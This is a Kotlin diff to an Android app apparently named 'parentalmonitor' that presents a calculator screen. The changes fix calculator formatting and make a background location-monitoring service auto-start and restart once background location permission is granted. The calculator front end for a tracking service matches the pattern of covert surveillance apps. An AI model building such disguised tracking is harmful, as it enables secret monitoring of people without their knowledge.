@@ -52,9 +52,9 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
             
             // RELEASE mode: Auto-start service after permissions granted
-            if (!BuildConfig.DEBUG && preferencesManager.isConfigured() && preferencesManager.userConsentedMonitoring && !preferencesManager.userDisabledMonitoring) {
+            if (!BuildConfig.DEBUG && preferencesManager.isConfigured() && preferencesManager.userConsentedMonitoring && !preferencesManager.userDisabledMonitoring && hasBackgroundLocation()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
-                if (!preferencesManager.isMonitoringEnabled) {
+                if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
                     try {
                         startMonitoringService()
                         preferencesManager.isMonitoringEnabled = true
@@ -110,6 +110,14 @@ class MainActivity : AppCompatActivity() {
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
         calculatorDisplay = findViewById(R.id.calculatorDisplay)
         calculatorHistory = findViewById(R.id.calculatorHistory)
+        calculatorDisplay?.let {
+            try {
+                androidx.core.widget.TextViewCompat.setAutoSizeTextTypeUniformWithConfiguration(
+                    it, 24, 56, 2, android.util.TypedValue.COMPLEX_UNIT_SP
+                )
+            } catch (_: Exception) {
+            }
+        }
         
         // Number buttons
         val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
@@ -214,9 +222,13 @@ class MainActivity : AppCompatActivity() {
         if (result == kotlin.math.floor(result) && abs < 1e12) {
             return result.toLong().toString()
         }
-        val intDigits = abs.toLong().toString().length
+        val floored = kotlin.math.floor(abs)
+        val intDigits = if (floored < 1.0) 1 else kotlin.math.log10(floored).toInt() + 1
+        if (intDigits > 12) {
+            return String.format(java.util.Locale.US, "%.8E", result)
+        }
         val maxScale = (12 - intDigits).coerceIn(0, 8)
-        val plain = java.math.BigDecimal(result)
+        val plain = java.math.BigDecimal.valueOf(result)
             .setScale(maxScale, java.math.RoundingMode.HALF_UP)
             .stripTrailingZeros()
             .toPlainString()
@@ -243,7 +255,7 @@ class MainActivity : AppCompatActivity() {
         }
         calculatorHistory?.text = when {
             justCalculated -> lastExpression
-            operator.isNotEmpty() -> "$previousNumber $operator"
+            operator.isNotEmpty() -> "${previousNumber.replace("-", "−")} $operator"
             else -> ""
         }
     }
@@ -278,7 +290,11 @@ class MainActivity : AppCompatActivity() {
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
             return
         }
-        if (!preferencesManager.isMonitoringEnabled) {
+        if (!hasBackgroundLocation()) {
+            android.util.Log.w("MainActivity", "Background location missing - waiting for Setup")
+            return
+        }
+        if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
             try {
                 startMonitoringService()
                 preferencesManager.isMonitoringEnabled = true
@@ -303,6 +319,11 @@ class MainActivity : AppCompatActivity() {
         return requiredPermissions.all { permission ->
             ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
         }
+    }
+
+    private fun hasBackgroundLocation(): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
     }
 
     private fun startMonitoringService() {
